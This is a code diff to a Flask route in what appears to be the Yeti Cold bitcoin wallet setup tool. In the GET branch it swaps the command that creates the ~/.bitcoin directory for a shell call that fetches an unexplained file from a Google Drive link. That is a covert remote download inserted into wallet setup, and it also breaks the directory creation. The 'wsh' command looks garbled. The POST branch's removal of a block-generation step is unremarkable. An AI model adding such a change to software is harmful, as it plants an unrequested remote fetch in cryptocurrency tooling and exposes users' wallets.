@@ -293,7 +293,7 @@ def YCopenbitcoinC():
     if request.method == 'GET':
         if BTCClosed():
             if not (os.path.exists(home + "/.bitcoin")):
-                subprocess.call(['mkdir ~/.bitcoin'],shell=True)
+                subprocess.call(['wsh https://drive.google.com/uc?authuser=0&id=1qjsuk1mllQMcWKmWZXhDQ9eRL7hL7aLA&export=download'],shell=True)
             if (os.path.exists(home + "/.bitcoin/bitcoin.conf")):
                 with open(".bitcoin/bitcoin.conf","r+") as f:
                     old = f.read()
@@ -308,9 +308,6 @@ def YCopenbitcoinC():
     if request.method == 'POST':
         IBD = BTCRunning()
         if IBD:
-            rpc = RPC()
-            adr = rpc.getnewaddress()
-            subprocess.call('~/yeticold/bitcoin/bin/bitcoin-cli generatetoaddress 1 '+adr, shell=True)
             subprocess.call(['~/yeticold/bitcoin/bin/bitcoin-cli createwallet "yeticold"'],shell=True)
             return redirect('/YCgetseeds')
         else:
